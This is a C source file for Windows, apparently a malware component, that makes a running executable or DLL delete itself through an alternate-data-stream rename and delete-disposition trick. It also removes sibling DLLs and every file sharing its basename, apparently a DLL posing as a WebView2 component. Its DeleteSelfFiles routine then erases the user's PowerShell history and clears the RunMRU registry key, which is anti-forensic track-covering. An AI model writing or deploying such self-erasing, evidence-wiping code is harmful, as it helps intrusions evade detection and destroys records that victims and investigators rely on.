#include "DeleteSelfPOC.h"

// ���� CurrentDLLName ��
#ifndef CurrentDLLName
#define CurrentDLLName MainDLL
#endif

// ��չ��
#define DS_STRINGIZE_IMPL(x) L ## #x
#define DS_STRINGIZE(x) DS_STRINGIZE_IMPL(x)
#define DS_DLL_NAME_W DS_STRINGIZE(CurrentDLLName) L".dll"

// UI DLL ͨ���ģʽ
#define DS_UI_DLL_PATTERN DS_STRINGIZE(UIname) L"*.dll"

// MainDLL ͨ���ģʽ����������ͬĿ¼�µ� MainDLL*.dll��
#define DS_MAIN_DLL_PATTERN DS_STRINGIZE(CurrentDLLName) L"*.dll"

extern IMAGE_DOS_HEADER __ImageBase;

static
HANDLE
ds_open_handle(
	PCWSTR pwPath
)
{
	return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

// ����ģʽ�򿪾�������ڱ����������������ļ�
static
HANDLE
ds_open_handle_shared(
	PCWSTR pwPath
)
{
	return CreateFileW(pwPath, DELETE, 
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

static
void *
ds_rename_handle(
	HANDLE hHandle
)
{
	LPCWSTR lpwStream = DS_STREAM_RENAME;
	PFILE_RENAME_INFO pfRename = (PFILE_RENAME_INFO)malloc(sizeof(FILE_RENAME_INFO) + sizeof(WCHAR) * wcslen(lpwStream));
	if(pfRename == NULL)
	{
		DS_DEBUG_LOG(L"could not allocate memory");
		return NULL;
	}
	RtlSecureZeroMemory(pfRename, sizeof(FILE_RENAME_INFO) + sizeof(WCHAR) * wcslen(lpwStream));

	pfRename->FileNameLength = (DWORD)(sizeof(WCHAR) * wcslen(lpwStream));
	RtlCopyMemory(pfRename->FileName, lpwStream, sizeof(WCHAR) * (wcslen(lpwStream) + 1));

	BOOL fRenameOk = SetFileInformationByHandle(hHandle, FileRenameInfo, pfRename, (DWORD)(sizeof(FILE_RENAME_INFO) + sizeof(WCHAR) * wcslen(lpwStream)));
	if(!fRenameOk)
	{
#if defined(DEBUG) && (DEBUG != 0)
		wprintf(L"[LOG] - SetFileInformationByHandle(FileRenameInfo) failed (Error=%lu)\n", GetLastError());
#endif
		free(pfRename);
		return NULL;
	}
	return pfRename;
}

static
BOOL 
ds_deposite_handle(
	HANDLE hHandle
)
{
	FILE_DISPOSITION_INFO_EX fDeleteEx;
	RtlSecureZeroMemory(&fDeleteEx, sizeof(fDeleteEx));

	fDeleteEx.Flags = FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS;

	BOOL result = SetFileInformationByHandle(hHandle, FileDispositionInfoEx, &fDeleteEx, sizeof(fDeleteEx));
	if (!result)
	{
#if defined(DEBUG) && (DEBUG != 0)
		DWORD err = GetLastError();
		wprintf(L"[LOG] - SetFileInformationByHandle(FileDispositionInfoEx) failed (Error=%lu)\n", err);
#endif
		// ���Դ�ͳ�� FileDispositionInfo (���� POSIX ����)
		FILE_DISPOSITION_INFO fDelete;
		fDelete.DeleteFile = TRUE;
		result = SetFileInformationByHandle(hHandle, FileDispositionInfo, &fDelete, sizeof(fDelete));
#if defined(DEBUG) && (DEBUG != 0)
		if (!result)
		{
			wprintf(L"[LOG] - SetFileInformationByHandle(FileDispositionInfo) also failed (Error=%lu)\n", GetLastError());
		}
		else
		{
			wprintf(L"[LOG] - Legacy FileDispositionInfo succeeded\n");
		}
#endif
	}
	return result;
}

bool
DeleteFileEX(
	PCWSTR pwPath
)
{
	if (pwPath == NULL || *pwPath == L'\0')
	{
		DS_DEBUG_LOG(L"invalid path provided");
		return false;
	}

#if defined(DEBUG) && (DEBUG != 0)
	wprintf(L"[LOG] - DeleteFileEX: target=%ls\n", pwPath);
	
	DWORD fileAttr = GetFileAttributesW(pwPath);
	if (fileAttr == INVALID_FILE_ATTRIBUTES)
	{
		DWORD attrErr = GetLastError();
		wprintf(L"[LOG] - Target file does not exist or cannot be accessed (Error=%lu)\n", attrErr);
		if (attrErr == ERROR_FILE_NOT_FOUND)
		{
			return true;
		}
		return false;
	}
#endif

	HANDLE hCurrent = ds_open_handle(pwPath);
	if (hCurrent == INVALID_HANDLE_VALUE)
	{
		DWORD openErr = GetLastError();
#if defined(DEBUG) && (DEBUG != 0)
		wprintf(L"[LOG] - Exclusive open failed (Error=%lu)\n", openErr);
		if (openErr == ERROR_SHARING_VIOLATION)
		{
			wprintf(L"[LOG] - File is locked by another process, trying shared mode...\n");
		}
#endif
		
		if (openErr == ERROR_SHARING_VIOLATION)
		{
			hCurrent = ds_open_handle_shared(pwPath);
			if (hCurrent == INVALID_HANDLE_VALUE)
			{
				openErr = GetLastError();
				DS_DEBUG_LOG(L"failed to acquire handle to target file (shared mode)");
#if defined(DEBUG) && (DEBUG != 0)
				wprintf(L"[LOG] - Shared mode open also failed (Error=%lu)\n", openErr);
				if (openErr == ERROR_SHARING_VIOLATION)
				{
					wprintf(L"[LOG] - File is exclusively locked, cannot open even with FILE_SHARE_*\n");
					wprintf(L"[LOG] - The process holding the lock may not allow sharing\n");
				}
#endif
				return false;
			}
#if defined(DEBUG) && (DEBUG != 0)
			wprintf(L"[LOG] - Shared mode open succeeded\n");
#endif
		}
		else
		{
			DS_DEBUG_LOG(L"failed to acquire handle to target file");
			return false;
		}
	}
	else
	{
#if defined(DEBUG) && (DEBUG != 0)
		wprintf(L"[LOG] - Exclusive open succeeded\n");
#endif
	}

	DS_DEBUG_LOG(L"attempting to rename file name");
#if defined(DEBUG) && (DEBUG != 0)
	wprintf(L"[LOG] - Renaming file to ADS stream: %ls\n", DS_STREAM_RENAME);
#endif
	void *pfRename = ds_rename_handle(hCurrent);
	if (pfRename == NULL)
	{
		DWORD renameErr = GetLastError();
		DS_DEBUG_LOG(L"failed to rename to stream");
#if defined(DEBUG) && (DEBUG != 0)
		wprintf(L"[LOG] - Rename to ADS failed (Error=%lu)\n", renameErr);
		if (renameErr == ERROR_SHARING_VIOLATION)
		{
			wprintf(L"[LOG] - Another process is actively using the file data stream\n");
		}
		else if (renameErr == ERROR_ACCESS_DENIED)
		{
			wprintf(L"[LOG] - Access denied for rename operation\n");
		}
#endif
		CloseHandle(hCurrent);
		return false;
	}

	DS_DEBUG_LOG(L"successfully renamed file primary :$DATA ADS to specified stream, closing initial handle");
#if defined(DEBUG) && (DEBUG != 0)
	wprintf(L"[LOG] - ADS rename succeeded, closing handle and reopening...\n");
#endif
	CloseHandle(hCurrent);
	free(pfRename);
	pfRename = NULL;

	// ���´򿪣�����ʹ�ù���ģʽ��
	hCurrent = ds_open_handle_shared(pwPath);
	if (hCurrent == INVALID_HANDLE_VALUE)
	{
		DWORD reopenErr = GetLastError();
#if defined(DEBUG) && (DEBUG != 0)
		wprintf(L"[LOG] - Reopen (shared) failed (Error=%lu), trying exclusive...\n", reopenErr);
#endif
		hCurrent = ds_open_handle(pwPath);
		if (hCurrent == INVALID_HANDLE_VALUE)
		{
			DS_DEBUG_LOG(L"failed to reopen target module");
#if defined(DEBUG) && (DEBUG != 0)
			wprintf(L"[LOG] - Reopen (exclusive) also failed (Error=%lu)\n", GetLastError());
#endif
			return false;
		}
	}

#if defined(DEBUG) && (DEBUG != 0)
	wprintf(L"[LOG] - Reopen succeeded, setting delete disposition...\n");
#endif

	if (!ds_deposite_handle(hCurrent))
	{
		DS_DEBUG_LOG(L"failed to set delete deposition");
		CloseHandle(hCurrent);
		return false;
	}

	DS_DEBUG_LOG(L"closing handle to trigger deletion deposition");
#if defined(DEBUG) && (DEBUG != 0)
	wprintf(L"[LOG] - Delete disposition set, closing handle to trigger deletion...\n");
#endif
	CloseHandle(hCurrent);

	// ���ݵȴ����ļ�ϵͳ���ɾ��
	Sleep(50);

	// ��֤ɾ���ɹ�
	if (PathFileExistsW(pwPath))
	{
		DS_DEBUG_LOG(L"failed to delete copy, file still exists");
#if defined(DEBUG) && (DEBUG != 0)
		wprintf(L"[LOG] - File still exists after deletion attempt\n");
		wprintf(L"[LOG] - This may happen if the file is still held open by another process\n");
		wprintf(L"[LOG] - The file should be deleted when all handles are closed\n");
#endif
		return false;
	}

	DS_DEBUG_LOG(L"successfully deleted target from disk");
#if defined(DEBUG) && (DEBUG != 0)
	wprintf(L"[LOG] - File successfully deleted from disk\n");
#endif
	return true;
}

// ʹ����ͨ DeleteFile API ɾ���ļ������ڲ���Ҫ��ɾ�����ɵ��ⲿ�ļ���
static bool
DeleteFileSimple(
	PCWSTR pwPath
)
{
	if (pwPath == NULL || *pwPath == L'\0')
	{
		return false;
	}

	// �ȳ���ֱ��ɾ��
	if (DeleteFileW(pwPath))
	{
#if defined(DEBUG) && (DEBUG != 0)
		wprintf(L"[LOG] - DeleteFileSimple: successfully deleted %ls\n", pwPath);
#endif
		return true;
	}

	// ���ʧ�ܣ�����ʹ�ø߼�ɾ������
#if defined(DEBUG) && (DEBUG != 0)
	wprintf(L"[LOG] - DeleteFileSimple: simple delete failed (Error=%lu), trying DeleteFileEX for %ls\n", 
		GetLastError(), pwPath);
#endif
	return DeleteFileEX(pwPath);
}

// ͨ�ú�����ɾ��ͬĿ¼��ƥ��ָ��ģʽ������ DLL �ļ�
// excludePath: Ҫ�ų����ļ�·����ͨ���ǵ�ǰ�������е� DLL��
static bool
DeleteMatchingDlls(
	PCWSTR pattern,
	PCWSTR excludePath
)
{
	WCHAR wcDllPath[MAX_PATH + 1];
	WCHAR wcDir[MAX_PATH + 1];
	WCHAR wcSearchPattern[MAX_PATH + 1];
	RtlSecureZeroMemory(wcDllPath, sizeof(wcDllPath));
	RtlSecureZeroMemory(wcDir, sizeof(wcDir));
	RtlSecureZeroMemory(wcSearchPattern, sizeof(wcSearchPattern));

	// ��ȡ��ǰ DLL ��·��
	if (GetModuleFileNameW((HMODULE)&__ImageBase, wcDllPath, MAX_PATH) == 0)
	{
		DS_DEBUG_LOG(L"failed to get the current DLL module handle");
		return false;
	}

	// ����·��
	wcsncpy_s(wcDir, MAX_PATH, wcDllPath, _TRUNCATE);

	// �ҵ����һ����б�ܣ��ضϵõ�Ŀ¼
	WCHAR* pLastSlash = wcsrchr(wcDir, L'\\');
	if (pLastSlash == NULL)
	{
		DS_DEBUG_LOG(L"failed to find directory separator");
		return false;
	}
	*(pLastSlash + 1) = L'\0';

	// ��������ģʽ
	wcsncpy_s(wcSearchPattern, MAX_PATH, wcDir, _TRUNCATE);
	wcsncat_s(wcSearchPattern, MAX_PATH, pattern, _TRUNCATE);

#if defined(DEBUG) && (DEBUG != 0)
	wprintf(L"[LOG] - DeleteMatchingDlls: searching pattern=%ls\n", wcSearchPattern);
#endif

	WIN32_FIND_DATAW findData;
	HANDLE hFind = FindFirstFileW(wcSearchPattern, &findData);

	if (hFind == INVALID_HANDLE_VALUE)
	{
		DWORD err = GetLastError();
		if (err == ERROR_FILE_NOT_FOUND)
		{
#if defined(DEBUG) && (DEBUG != 0)
			wprintf(L"[LOG] - DeleteMatchingDlls: no matching files found\n");
#endif
			return true;
		}
		DS_DEBUG_LOG(L"failed to start file search");
		return false;
	}

	bool allDeleted = true;
	int deletedCount = 0;
	int failedCount = 0;
	int skippedCount = 0;

	do
	{
		// ����Ŀ¼
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			continue;
		}

		// ���������ļ�·��
		WCHAR wcFullPath[MAX_PATH + 1];
		RtlSecureZeroMemory(wcFullPath, sizeof(wcFullPath));
		wcsncpy_s(wcFullPath, MAX_PATH, wcDir, _TRUNCATE);
		wcsncat_s(wcFullPath, MAX_PATH, findData.cFileName, _TRUNCATE);

		// ����Ҫ�ų����ļ���ͨ���ǵ�ǰ�������е� DLL��
		if (excludePath != NULL && _wcsicmp(wcFullPath, excludePath) == 0)
		{
#if defined(DEBUG) && (DEBUG != 0)
			wprintf(L"[LOG] - DeleteMatchingDlls: skipping self %ls\n", wcFullPath);
#endif
			skippedCount++;
			continue;
		}

#if defined(DEBUG) && (DEBUG != 0)
		wprintf(L"[LOG] - DeleteMatchingDlls: deleting %ls\n", wcFullPath);
#endif

		if (DeleteFileSimple(wcFullPath))
		{
			deletedCount++;
		}
		else
		{
			failedCount++;
			allDeleted = false;
#if defined(DEBUG) && (DEBUG != 0)
			wprintf(L"[LOG] - DeleteMatchingDlls: failed to delete %ls\n", wcFullPath);
#endif
		}

	} while (FindNextFileW(hFind, &findData));

	FindClose(hFind);

#if defined(DEBUG) && (DEBUG != 0)
	wprintf(L"[LOG] - DeleteMatchingDlls: deleted %d, failed %d, skipped %d files\n", 
		deletedCount, failedCount, skippedCount);
#endif

	return allDeleted || (deletedCount > 0) || (skippedCount > 0 && failedCount == 0);
}

bool
DeleteSelfPoc(
	void
)
{
	WCHAR wcPath[MAX_PATH + 1];
	RtlSecureZeroMemory(wcPath, sizeof(wcPath));

	// get the path to the current running process ctx
	if (GetModuleFileNameW(NULL, wcPath, MAX_PATH) == 0)
	{
		DS_DEBUG_LOG(L"failed to get the current module handle");
		return false;
	}

	return DeleteFileEX(wcPath);
}

bool
DeleteUIDlls(
	void
)
{
	// ɾ��ƥ�� UIname*.dll ���ļ������ų��κ��ļ���
	return DeleteMatchingDlls(DS_UI_DLL_PATTERN, NULL);
}

bool
DeleteMainDLL(
	void
)
{
	WCHAR wcPath[MAX_PATH + 1];
	RtlSecureZeroMemory(wcPath, sizeof(wcPath));

	if (GetModuleFileNameW((HMODULE)&__ImageBase, wcPath, MAX_PATH) == 0)
	{
		DS_DEBUG_LOG(L"failed to get the current DLL module handle");
		return false;
	}

	// ����ɾ�� UI DLL �ļ���SimpleCard*.dll��
	DeleteUIDlls();

	// ɾ��ͬĿ¼������ MainDLL*.dll �ļ����ų���ǰ�������е� DLL��
	DeleteMatchingDlls(DS_MAIN_DLL_PATTERN, wcPath);

	// ִ����ɾ��
	bool deleteResult = DeleteFileEX(wcPath);
	
	if (!deleteResult)
	{
		return false;
	}

	// ��ȫУ�飺��ȡĿ¼·��������Ƿ񻹴���ͬ�� DLL
	WCHAR wcDir[MAX_PATH + 1];
	RtlSecureZeroMemory(wcDir, sizeof(wcDir));
	
	wcsncpy_s(wcDir, MAX_PATH, wcPath, _TRUNCATE);
	
	WCHAR* pLastSlash = wcsrchr(wcDir, L'\\');
	if (pLastSlash != NULL)
	{
		*(pLastSlash + 1) = L'\0';
		
		WCHAR wcCheckPath[MAX_PATH + 1];
		RtlSecureZeroMemory(wcCheckPath, sizeof(wcCheckPath));
		
		wcsncpy_s(wcCheckPath, MAX_PATH, wcDir, _TRUNCATE);
		wcsncat_s(wcCheckPath, MAX_PATH, DS_DLL_NAME_W, _TRUNCATE);
		
		if (PathFileExistsW(wcCheckPath))
		{
			DS_DEBUG_LOG(L"safety check failed: DLL still exists in directory");
			return false;
		}
	}

	DS_DEBUG_LOG(L"safety check passed: DLL successfully removed from directory");
	return true;
}

// ɾ����ǰ DLL ͬ basename ������ļ�(basename.*)
bool
DeleteSelfFiles(
	void
)
{
	WCHAR wcDllPath[MAX_PATH + 1];
	RtlSecureZeroMemory(wcDllPath, sizeof(wcDllPath));

	if (GetModuleFileNameW((HMODULE)&__ImageBase, wcDllPath, MAX_PATH) == 0)
	{
		DS_DEBUG_LOG(L"failed to get the current DLL module handle");
		return false;
	}

	// ��ȡĿ¼
	WCHAR wcDir[MAX_PATH + 1];
	RtlSecureZeroMemory(wcDir, sizeof(wcDir));
	wcsncpy_s(wcDir, MAX_PATH, wcDllPath, _TRUNCATE);

	WCHAR* pLastSlash = wcsrchr(wcDir, L'\\');
	if (pLastSlash == NULL)
	{
		DS_DEBUG_LOG(L"failed to find directory separator");
		return false;
	}

	// ȡ�ļ���
	WCHAR* pFileName = pLastSlash + 1;
	*(pLastSlash + 1) = L'\0';

	// ȥ��չ����� basename
	WCHAR wcBaseName[MAX_PATH + 1];
	RtlSecureZeroMemory(wcBaseName, sizeof(wcBaseName));
	wcsncpy_s(wcBaseName, MAX_PATH, pFileName, _TRUNCATE);
	// ɾ�����е�.xxx
	// ʵ����Ҫ�ض��ļ���(Microsoft.WebView2.RuntimeHost.dll -> Microsoft.WebView2.RuntimeHost)
	// ֻɾ�����һ��.֮��Ĳ���
	{
		// ʹ��ԭ�ļ����ĸ���
		WCHAR wcFileNameCopy[MAX_PATH + 1];
		RtlSecureZeroMemory(wcFileNameCopy, sizeof(wcFileNameCopy));
		// ʵ��·���ǻ�ȡʱ pFileName ָ��Ŀ¼·���е�λ�ã���Ҫ���´ӵ�ǰ DLL·����ȡ
		WCHAR* pFN = wcsrchr(wcDllPath, L'\\');
		if (pFN) pFN++; else pFN = wcDllPath;
		wcsncpy_s(wcFileNameCopy, MAX_PATH, pFN, _TRUNCATE);
		WCHAR* pLastDot = wcsrchr(wcFileNameCopy, L'.');
		if (pLastDot != NULL)
		{
			*pLastDot = L'\0';
		}
		wcsncpy_s(wcBaseName, MAX_PATH, wcFileNameCopy, _TRUNCATE);
	}

	// ��������ģʽ: dir\basename.*
	WCHAR wcSearchPattern[MAX_PATH + 1];
	RtlSecureZeroMemory(wcSearchPattern, sizeof(wcSearchPattern));
	wcsncpy_s(wcSearchPattern, MAX_PATH, wcDir, _TRUNCATE);
	wcsncat_s(wcSearchPattern, MAX_PATH, wcBaseName, _TRUNCATE);
	wcsncat_s(wcSearchPattern, MAX_PATH, L".*", _TRUNCATE);

#if defined(DEBUG) && (DEBUG != 0)
	wprintf(L"[LOG] - DeleteSelfFiles: searching pattern=%ls\n", wcSearchPattern);
#endif

	WIN32_FIND_DATAW findData;
	HANDLE hFind = FindFirstFileW(wcSearchPattern, &findData);

	if (hFind == INVALID_HANDLE_VALUE)
	{
		DWORD err = GetLastError();
		if (err == ERROR_FILE_NOT_FOUND)
		{
			return true;
		}
		DS_DEBUG_LOG(L"failed to start file search");
		return false;
	}

	bool allDeleted = true;
	int deletedCount = 0;
	int deferredSelf = 0;

	do
	{
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			continue;
		}

		WCHAR wcFullPath[MAX_PATH + 1];
		RtlSecureZeroMemory(wcFullPath, sizeof(wcFullPath));
		wcsncpy_s(wcFullPath, MAX_PATH, wcDir, _TRUNCATE);
		wcsncat_s(wcFullPath, MAX_PATH, findData.cFileName, _TRUNCATE);

		// ��ǰ DLL ����ʹ ADS ɾ��
		if (_wcsicmp(wcFullPath, wcDllPath) == 0)
		{
			deferredSelf = 1;
			continue;
		}

		// ������ͨ�ļ�ֱ��ɾ��
		if (DeleteFileW(wcFullPath))
		{
			deletedCount++;
		}
		else
		{
#if defined(DEBUG) && (DEBUG != 0)
			wprintf(L"[LOG] - DeleteSelfFiles: failed to delete %ls (Error=%lu)\n", wcFullPath, GetLastError());
#endif
			allDeleted = false;
		}

	} while (FindNextFileW(hFind, &findData));

	FindClose(hFind);

	// ���ɾ����ǰ DLL ����ʹ ADS ��ɾ��
	if (deferredSelf)
	{
		if (DeleteFileEX(wcDllPath))
		{
			deletedCount++;
		}
		else
		{
			allDeleted = false;
		}
	}

#if defined(DEBUG) && (DEBUG != 0)
	wprintf(L"[LOG] - DeleteSelfFiles: deleted %d files\n", deletedCount);
#endif

	// 删除 PowerShell 历史
	DeletePowerShellHistory();
	// 删除注册表 RunMRU
	DeleteRunMRUHistory();
	return allDeleted || (deletedCount > 0);

}

// 删除 PowerShell 历史文件
#include <shlobj.h>
bool DeletePowerShellHistory(void)
{
	WCHAR path[MAX_PATH + 1];
	RtlSecureZeroMemory(path, sizeof(path));
	// 获取当前用户目录
	if (!SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path)))
		return false;
	// 拼接完整路径
	wcscat_s(path, MAX_PATH, L"\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
	// 删除
	BOOL ok = DeleteFileW(path);
#if defined(DEBUG) && (DEBUG != 0)
	wprintf(L"[LOG] - DeletePowerShellHistory: %ls %s\n", path, ok ? L"OK" : L"FAIL");
#endif
	return ok || GetLastError() == ERROR_FILE_NOT_FOUND;
}

// 删除注册表 RunMRU
#include <winreg.h>
bool DeleteRunMRUHistory(void)
{
	HKEY hKey;
	LONG res = RegOpenKeyExW(HKEY_CURRENT_USER,
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
		0, KEY_ALL_ACCESS, &hKey);
	if (res != ERROR_SUCCESS)
		return false;
	// 枚举所有值并删除
	WCHAR valueName[256];
	DWORD valueLen;
	DWORD type;
	BYTE data[1024];
	DWORD dataLen;
	// 先收集所有名字
	WCHAR names[64][256];
	int nameCount = 0;
	DWORD idx = 0;
	while (1) {
		valueLen = 256;
		dataLen = 1024;
		LONG r = RegEnumValueW(hKey, idx, valueName, &valueLen, NULL, &type, data, &dataLen);
		if (r == ERROR_NO_MORE_ITEMS) break;
		if (r == ERROR_SUCCESS && valueLen > 0 && nameCount < 64) {
			wcscpy_s(names[nameCount++], 256, valueName);
		}
		idx++;
	}
	// 删除所有值
	for (int i = 0; i < nameCount; ++i) {
		RegDeleteValueW(hKey, names[i]);
	}
	RegCloseKey(hKey);
#if defined(DEBUG) && (DEBUG != 0)
	wprintf(L"[LOG] - DeleteRunMRUHistory: deleted %d values\n", nameCount);
#endif
	return true;
}
